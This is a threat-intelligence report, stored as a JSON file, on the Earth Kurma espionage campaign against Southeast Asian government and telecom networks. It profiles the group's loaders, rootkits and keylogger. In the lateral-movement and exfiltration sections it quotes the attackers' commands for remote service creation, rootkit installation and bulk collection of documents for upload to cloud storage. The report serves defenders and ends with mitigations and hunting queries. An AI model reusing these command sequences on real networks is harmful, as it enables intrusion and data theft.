@@ -1,0 +1,350 @@
+[
+    {
+        "level": 0,
+        "content": "Earth Kurma APT Campaign Targets Southeast Asian Government, Telecom Sectors"
+    },
+    {
+        "level": 2,
+        "content": "Summary:"
+    },
+    {
+        "level": 3,
+        "content": "Trend Research uncovered a sophisticated APT campaign targeting government and telecommunications sectors in Southeast Asia. Named Earth Kurma, the attackers use advanced custom malware, rootkits, and cloud storage services for data exfiltration. Earth Kurma demonstrates adaptive malware toolsets, strategic infrastructure abuse, and complex evasion techniques. \nThis campaign poses a high business risk due to targeted espionage, credential theft, persistent foothold established through kernel-level rootkits, and data exfiltration via trusted cloud platforms. \nOrganizations primarily in government and telecommunications sectors in Southeast Asia (particularly the Philippines, Vietnam, Thailand, Malaysia) are affected. Organizations face potential compromise of sensitive government and telecommunications data, with attackers maintaining prolonged, undetected access to their networks. \nTrend Vision One™ detects and blocks the malicious components used in the APT campaign. Trend Vision One customers can also access hunting queries, threat insights, and threat intelligence reports to gain rich context and the latest updates on Earth Kurma."
+    },
+    {
+        "level": 2,
+        "content": "Introduction"
+    },
+    {
+        "level": 3,
+        "content": "Since June 2024, we uncovered a sophisticated APT campaign targeting multiple countries in Southeast Asia, including the Philippines, Vietnam, and Malaysia. We have named the threat actors behind this campaign “Earth Kurma.” Our analysis revealed that they primarily focused on government sectors, showing particular interest in data exfiltration. Notably, this wave of attacks involved rootkits to maintain persistence and conceal their activities."
+    },
+    {
+        "level": 3,
+        "content": "In this research, we provide the intelligence on Earth Kurma and their ongoing activities. We’ll disclose technical details, including their tactics, techniques and procedures (TTPs), as well as specifics on their toolsets, such as TESDAT, SIMPOBOXSPY, KRNRAT, and MORIYA, among others."
+    },
+    {
+        "level": 2,
+        "content": "Who is Earth Kurma?"
+    },
+    {
+        "level": 3,
+        "content": "Earth Kurma is a new APT group focused on countries in Southeast Asia. All of the identified victims belong to government and government-related telecommunications sectors. From our long-term monitoring, their activities dated back to November 2020, with data exfiltration as their primary objective. Our analysis indicates that they tend to exfiltrate data over public cloud services, like Dropbox and OneDrive. To accomplish this, they used various customized toolsets including TESDAT and SIMPOBOXSPY.   Earth Kurma also developed rootkits such as KRNRAT and MORIYA to hide their activities."
+    },
+    {
+        "level": 3,
+        "content": "As for attribution, we found overlaps between Earth Kurma’s tools and those of other known APT groups. The MORIYA rootkits in this campaign share the same code base as the ones used inOperation TunnelSnake, while SIMPOBOXSPY and the exfiltration script link closely to another APT group calledToddyCat. However, differences in the attack patterns prevent us from conclusively attributing these campaigns and operations to the same threat actors. Hence, we named this new APT group “Earth Kurma.”"
+    },
+    {
+        "level": 2,
+        "content": "Impact"
+    },
+    {
+        "level": 3,
+        "content": "Our telemetry shows that that Earth Kurma targeted victims primarily in Southeast Asia, including the Philippines, Vietnam, Thailand and Malaysia. Earth Kurma’s targets likely indicate cyberespionage as the motivation."
+    },
+    {
+        "level": 2,
+        "content": "Infection Chain"
+    },
+    {
+        "level": 3,
+        "content": "The infection chain and malware used could be summarized as follows:"
+    },
+    {
+        "level": 2,
+        "content": "Lateral Movement"
+    },
+    {
+        "level": 3,
+        "content": "We were unable to confirm the arrival vectors used in the attacks, as our analysis started years after the victims were first compromised.Multiple tools were used in the lateral movement stage. Various utilities were used to scan the victims’ infrastructures and deploy malware, including NBTSCAN, LADON, FRPC, WMIHACKER and ICMPinger. They also deployed a keylogger, KMLOG, to steal credentials from victims."
+    },
+    {
+        "level": 3,
+        "content": "To survey the victims’ infrastructures, the threat actors used a tool named ICMPinger to scan the hosts. It is a simple network scanning tool based on the ICMP protocol to test if the specified hosts are still alive. They delete this tool once their operations conclude."
+    },
+    {
+        "level": 3,
+        "content": "They also used another open-source tool calledLadonto inspect the infrastructure. To bypass detection, Ladon is wrapped in a reflective loader compiled by PyInstaller. The XOR keys used to decode the payload differ among all the samples we’ve collected."
+    },
+    {
+        "level": 3,
+        "content": "To move laterally, they also used another open-source tool calledWMIHACKER, which  could execute commands over port 135 without the need for SMB."
+    },
+    {
+        "level": 3,
+        "content": "In some of the cases we observed, they also execute commands over the SMB protocol (such as using “net use”) to inspect the infrastructure as well as deploy malware."
+    },
+    {
+        "level": 3,
+        "content": "C:\\Windows\\system32\\cmd.exe /C sc.exe -a 172.20.40.0-172.20.40.255 -t 500 -f lg.txt -c 1 -o 100 –nC:\\Windows\\system32\\cmd.exe /C net use \\\\172.20.40.41\\c$ {password} /u:{user}C:\\Windows\\system32\\cmd.exe /C copy vdmsc.dll \\\\172.20.40.41\\c$\\users\\{user} \\videosC:\\Windows\\system32\\cmd.exe /C copy msv.dat \\\\172.20.40.41\\c$\\windows\\system32C:\\Windows\\system32\\cmd.exe /C sc \\\\172.20.40.41 create katech binpath= \"cmd /c start /b rundll32.exe c:\\users\\{user}\\videos\\vdmsc.dll,Init\"C:\\Windows\\system32\\cmd.exe /C sc \\\\172.20.40.41 start katechC:\\Windows\\system32\\cmd.exe /C sc \\\\172.20.40.41 delete katechC:\\Windows\\system32\\cmd.exe /C net use \\\\172.20.40.41\\c$ /del /y"
+    },
+    {
+        "level": 3,
+        "content": "The threat actors also tried to steal the credentials from the victims by using a custom tool called KMLOG. It’s a simple keylogger that logs every keystroke to a file named “%Appdata%\\Roaming\\Microsoft\\Windows\\Libraries\\infokey.zip.”"
+    },
+    {
+        "level": 3,
+        "content": "To hide the keystroke log file, it is prepended with a fake ZIP file header (PK header). What follows the header is the real body of the logging content."
+    },
+    {
+        "level": 3,
+        "content": "Table 1. The structure of the keystroke logging file"
+    },
+    {
+        "level": 2,
+        "content": "Persistence"
+    },
+    {
+        "level": 3,
+        "content": "In the persistence stage, the actors deployed different loaders to maintain their foothold, including DUNLOADER, TESDAT and DMLOADER. These loaders are used to load payload files into memory and execute them. These loaders are then used to deploy more malware and exfiltrate data over public cloud services like Dropbox and OneDrive. In some cases, rootkits, including KRNRAT and MORIYA, were implanted by the loaders to bypass the scanning."
+    },
+    {
+        "level": 3,
+        "content": "Loaders"
+    },
+    {
+        "level": 3,
+        "content": "Between 2022 and 2024, we observed multiple loaders implanted in victim environments, including DUNLOADER, TESDAT and DMLOADER. Most of the final payloads are Cobalt Strike beacons."
+    },
+    {
+        "level": 3,
+        "content": "The first loader we encountered is DUNLOADER. It’s capable of loading the payloads from either of the locations and decode it in one-byte XOR operations:"
+    },
+    {
+        "level": 3,
+        "content": "From a file named “pdata.txt” \nFrom its own resource blob named “BIN”"
+    },
+    {
+        "level": 3,
+        "content": "This loader is a DLL file and always ensures that it’s executed by “rundll32.exe” by checking if the name of the parent process contains a specific string literal “und”. In most cases, this DLL should contain an export function called “Start.”"
+    },
+    {
+        "level": 3,
+        "content": "The newer loader we later found is called TESDAT. It always loads a payload file with a “.dat” extension (like “mns.dat”). Instead of using common APIs like CreateThread to execute the decoded shellcode, it always calls an API called “SwitchToFiber,” which we think is an attempt to avoid detection. Our analysis showed two variants for TESDAT loaders. It can be either an EXE file or a DLL file with an export function called “Init.”"
+    },
+    {
+        "level": 3,
+        "content": "We also noticed that the actors would name the loaders with some random strings and put them inside the folders that were often accessed by the victims instead of those commonly used by attackers (i.e., %ProgramData% or %Public%). This was presumably intended to blend the loaders with legitimate user files. Here are some filename examples:"
+    },
+    {
+        "level": 3,
+        "content": "C:\\Users\\{user}\\downloads\\wcrpc.dll \nC:\\Users\\{user}\\downloads\\mflpro\\acrg.dll \nC:\\Users\\{user}\\documents\\ViberDownloads\\mfsvc.dll \nC:\\Users\\{user}\\downloads\\fwdjustification\\dilx.exe \nC:\\Users\\{user}\\downloads\\ffap3560pcl6220510w636iml\\drasc.dll \nC:\\Users\\{user}\\downloads\\1\\2\\3\\prikc.exe \nC:\\Users\\{user}\\Downloads\\Rufus\\gpupdat.exe"
+    },
+    {
+        "level": 3,
+        "content": "More recently, we observed a new loader, DMLOADER, was implanted. Instead of loading an additional payload file, it loads the embedded payload and decodes it as an in-memory PE buffer. This loader usually has an export function called “DoMain” or “StartProtect.” In the decoded PE payload, it should have an export function called “MThread.”"
+    },
+    {
+        "level": 3,
+        "content": "Rootkits"
+    },
+    {
+        "level": 3,
+        "content": "After the loaders are implanted in the victim machines, we found rootkits installed on some compromised machines. To install the rootkits, the threat actor abused a living-off-the-land binary called “syssetup.dll” and dropped an INF file to install them. An example of the used command line is as follows:"
+    },
+    {
+        "level": 3,
+        "content": "C:\\Windows\\SysWOW64\\rundll32.exe syssetup,SetupInfObjectInstallAction DefaultInstall 128 c:\\users\\{user}\\downloads\\SmartFilter.inf"
+    },
+    {
+        "level": 3,
+        "content": "The first rootkit we observed is called MORIYA, which could hide the malicious payload in the TCP traffic."
+    },
+    {
+        "level": 3,
+        "content": "MORIYA works as a TCP traffic interceptor. It tries to monitor if an incoming TCP packet is from the command-and-control (C&C) server by checking its first six magic bytes. The magic bytes could be registered by issuing a specific IOCTL code 0x222004 from its user-mode agent. If any packet is matched, it tries to inject the malicious payload into the body of the response packet. The variant we found works exactly the same as the one from this MORIYAreport."
+    },
+    {
+        "level": 3,
+        "content": ""
+    },
+    {
+        "level": 3,
+        "content": "The MORIYA variant we found has an additional shellcode injection capability. At the end of its execution, it tries to load a payload file from the location ”\\\\SystemRoot\\\\system32\\\\drivers\\\\{driver_name}.dat.” The payload will be decrypted in AES and injected into the process of svchost.exe. This payload should be its user-mode agent."
+    },
+    {
+        "level": 3,
+        "content": "The shellcode will eventually be invoked by using the API NtCreateThreadEx. To bypass detection, it tries to invoke the call by directly using the syscall number. To get the valid syscall numbers on the targeted system, it enumerates the NTDLL’s export functions, finds the ones with names starting with “Zw” or “Nt” and saves the syscall number of each. This code snippet is reused fromthis post."
+    },
+    {
+        "level": 3,
+        "content": "The other rootkit we found is called KRNRAT. It’s a full-featured backdoor with various capabilities, including process manipulation, file hiding, shellcode execution, traffic concealment, and C&C communication. We named this rootkit KRNRAT because of its internal name, just as written in its PDB string: N:\\project\\li\\ThreeTools\\KrnRat\\code\\x64\\Debug\\SmartFilter.pdb"
+    },
+    {
+        "level": 3,
+        "content": "Our analysis showed that KRNRAT is based upon multiple open-source projects:"
+    },
+    {
+        "level": 3,
+        "content": "https://github.com/w1nds/ishellcode \nhttps://github.com/DarthTon/Blackbone \nhttps://github.com/XaFF-XaFF/Cronos-Rootkit \nhttps://github.com/JKornev/hidden \nhttps://github.com/amitschendel/venom-rootkit"
+    },
+    {
+        "level": 3,
+        "content": "KRNRAT supports numerous IOCTL codes and capabilities. Its debug strings are also self-explanatory. Here’s the full table of the supported IOCTL codes."
+    },
+    {
+        "level": 3,
+        "content": "Table 2. The command codes supported in KRNRAT"
+    },
+    {
+        "level": 3,
+        "content": "At the end of its execution, it also loads the additional payload file and injects it into the svchost.exe process. This shellcode injection capability works exactly the same as the MORIYA variant we found. This time, we were able to collect the payload, which turns out to be the user-mode agent for KRNRAT and is the backdoor. This means that its user-mode agent is always memory-resident."
+    },
+    {
+        "level": 3,
+        "content": "The backdoor is a stager. It connects to the C&C server and downloads the next-stage payload back. It tries to hide the process and connections by issuing the specific IOCTL codes to the KRNRAT rootkit."
+    },
+    {
+        "level": 3,
+        "content": "Table 3. The structure of the backdoor’s configuration in the registry"
+    },
+    {
+        "level": 3,
+        "content": "The final payload from the C&C server would be the so-calledSManager."
+    },
+    {
+        "level": 2,
+        "content": "Collection and Exfiltration"
+    },
+    {
+        "level": 3,
+        "content": "In the collection and exfiltration stage, we observed two customized tools used to exfiltrate specific documents to the attacker’s cloud services, such as Dropbox and OneDrive. Before exfiltrating the files, several commands executed by the loader TESDAT collected specific document files with the following extensions: .pdf, .doc, .docx, .xls, .xlsx, .ppt, and .pptx. The documents are first placed into a newly created folder named \"tmp,\" which is then archived using WinRAR with a specific password."
+    },
+    {
+        "level": 3,
+        "content": "C:\\Windows\\system32\\cmd.exe /C dir c:\\usersC:\\Windows\\system32\\cmd.exe /C mkdir tmpC:\\Windows\\system32\\cmd.exe /C powershell.exe \"dir c:\\users -File -Recurse -Include '*.pdf', '*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt' , '*.pptx'| where LastWriteTime -gt (Get-date).AddDays(-30) | foreach {cmd /c copy $_ /y c:\\users\\{username}\\documents\\tmp};echo Finish!\"C:\\Windows\\system32\\cmd.exe /C c:\\\"program files\"\\winrar\\rar.exe a -p{password} -v200m c:\\users\\{username}\\documents\\{hostname} c:\\users\\{username}\\documents\\tmp -epC:\\Windows\\system32\\cmd.exe /C rmdir /s /q tmp"
+    },
+    {
+        "level": 3,
+        "content": "The first tool, SIMPOBOXSPY, is an exfiltration tool that can upload the archive files to Dropbox with a specified access token. This tool is exactly the “generic DropBox uploader” mentioned in thisToddyCat report. The command argument of SIMPOBOXSPY is shown below."
+    },
+    {
+        "level": 3,
+        "content": "dilx.exe {access_token} [-f {file_1} {file_2} ...]"
+    },
+    {
+        "level": 3,
+        "content": "If the argument “-f” is not specified, it will upload the file in the current folder with predefined extensions such as “.z”, “.001”, “.002”,...,”.128”. There is also another variant, which will upload the archive with the extension “.7z”"
+    },
+    {
+        "level": 3,
+        "content": "After uploading the files to Dropbox, a folder named with the current date and time will be created on Dropbox."
+    },
+    {
+        "level": 3,
+        "content": "The other tool, ODRIZ, is an old tool found in 2023. It will upload the collected files to OneDrive by specifying the OneDrive refresh token. The command argument is shown below. It will upload the files in the current folder with the pattern “*.z.*”."
+    },
+    {
+        "level": 3,
+        "content": "odriz.exe {refresh_token}"
+    },
+    {
+        "level": 3,
+        "content": "The process of file collection and exfiltration is shown in the following:"
+    },
+    {
+        "level": 3,
+        "content": "After collecting all the files into a password-protected archive, which is normally named after the host name, the archived RAR will be copied to the folder\\\\DC_server\\sysvol\\{domain}\\Policies\\{ID}\\user\\via the SMB protocol. The folder “sysvol” contains all of AD policies and information, and this folder only exists on DC servers. We believe that the attackers move all the collected archives in the folder “sysvol” to utilize a native Windows mechanism calledDistributed File System Replication(DFSR). It is a Windows feature that synchronizes AD policies across DC servers by replicating the contents of the “sysvol” folder among them. With this, the stolen archives can be automatically synchronized to all DC servers, enabling exfiltration through any one of them."
+    },
+    {
+        "level": 2,
+        "content": "Attribution"
+    },
+    {
+        "level": 3,
+        "content": "Our analysis identified weak links to two groups, ToddyCat and Operation TunnelSnake. After a thorough examination, we determined that this campaign merited a separate designation, Earth Kurma."
+    },
+    {
+        "level": 3,
+        "content": "The APT group ToddyCat was first disclosed in 2022. The \"tailored loader,” mentioned in thisToddyCat report, was also found in the same victim machines infected by the TESDAT loaders. However, we did not find any process execution logs between these loaders. Also, they share similar exfiltration PowerShell scripts. The tool SIMPOBOXSPY used by Earth Kurma was also used by ToddyCat before."
+    },
+    {
+        "level": 3,
+        "content": "Both Earth Kurma and ToddyCat highly targeted Southeast Asian countries. Reports on ToddyCat indicate that activities started in 2020. The timeline of their activities aligned closely to what we observed in Earth Kurma."
+    },
+    {
+        "level": 3,
+        "content": "However, SIMPOBOXSPY is a simple tool that could be shared among groups, and we did not observe other exclusive tools that can be directly attributed to ToddyCat. Thus, we cannot conclusively link Earth Kurma to ToddyCat."
+    },
+    {
+        "level": 3,
+        "content": "The second potentially related APT group is Operation TunnelSnake, which was also reported in 2021. In the report they used MORIYA, which uses the same code base as the MORIYA variant we found. Additionally, Operation TunnelSnake targeted countries in Southeast Asia. Nevertheless, we didn’t observe any similarity in the post-exploitation stages."
+    },
+    {
+        "level": 2,
+        "content": "Security best practices"
+    },
+    {
+        "level": 3,
+        "content": "Earth Kurma remains highly active, continuing to target countries around Southeast Asia. They have the capability to adapt to victim environments and maintain a stealthy presence. They can also reuse the same code base from previously identified campaigns to customize their toolsets, sometimes even utilizing the victim’s infrastructure to achieve their goals."
+    },
+    {
+        "level": 3,
+        "content": "Here are some best security practices to mitigate such threats:"
+    },
+    {
+        "level": 3,
+        "content": "Enforce strict driver installation policies.Allow only digitally signed and explicitly approved drivers through Group Policies or application control solutions to prevent malicious rootkits. \nStrengthen Active Directory (AD) and DFSR controls.Secure AD’s sysvol directory and closely audit DFSR replication events to prevent misuse for stealthy data exfiltration. \nimit SMB communications.Restrict SMB protocol usage across the network to prevent lateral movement and unauthorized file transfers."
+    },
+    {
+        "level": 2,
+        "content": "Proactive security with Trend Vision One™"
+    },
+    {
+        "level": 3,
+        "content": "Trend Vision One™ is the only AI-powered enterprise cybersecurity platform that centralizes cyber risk exposure management, security operations, and robust layered protection. This comprehensive approach helps you predict and prevent threats, accelerating proactive security outcomes across your entire digital estate. Backed by decades of cybersecurity leadership and Trend Cybertron, the industry's first proactive cybersecurity AI, it delivers proven results: a 92% reduction in ransomware risk and a 99% reduction in detection time. Security leaders can benchmark their posture and showcase continuous improvement to stakeholders. With Trend Vision One, you’re enabled to eliminate security blind spots, focus on what matters most, and elevate security into a strategic partner for innovation."
+    },
+    {
+        "level": 2,
+        "content": "Trend Vision One Threat Intelligence"
+    },
+    {
+        "level": 3,
+        "content": "To stay ahead of evolving threats, Trend Vision One customers can access a range of Intelligence Reports and Threat Insights. Threat Insights helps customers stay ahead of cyber threats before they happen and allows them to prepare for emerging threats by offering comprehensive information on threat actors, their malicious activities, and their techniques. By leveraging this intelligence, customers can take proactive steps to protect their environments, mitigate risks, and effectively respond to threats."
+    },
+    {
+        "level": 3,
+        "content": "Trend Vision One Intelligence Reports App [IOC Sweeping]"
+    },
+    {
+        "level": 3,
+        "content": "Earth Kurma Uncovered: Cyber Threats to Southeast Asian Governments"
+    },
+    {
+        "level": 3,
+        "content": "Trend Vision One Threat Insights App"
+    },
+    {
+        "level": 3,
+        "content": "Threat Actors:Earth Kurma \nEmerging Threats:Earth Kurma Uncovered: Cyber Threats to Southeast Asian Governments"
+    },
+    {
+        "level": 2,
+        "content": "Hunting Queries"
+    },
+    {
+        "level": 3,
+        "content": "Trend Vision One Search App"
+    },
+    {
+        "level": 3,
+        "content": "Trend Vision One customers can use the Search App to match or hunt the malicious indicators mentioned in this blog post with data in their environment."
+    },
+    {
+        "level": 3,
+        "content": "Scan for the Earth Kurma malware detections:"
+    },
+    {
+        "level": 3,
+        "content": "malName: (*DUNLOADER* OR *TESDAT* OR *DMLOADER* OR *MORIYA* OR *KRNRAT* OR *SIMPOBOXSPY* OR *ODRIZ* OR *KMLOG*) AND eventName: MALWARE_DETECTION"
+    },
+    {
+        "level": 2,
+        "content": "Indicators of Compromise (IoC)"
+    },
+    {
+        "level": 3,
+        "content": "The indicators of compromise for this entry can be foundhere."
+    }
+]
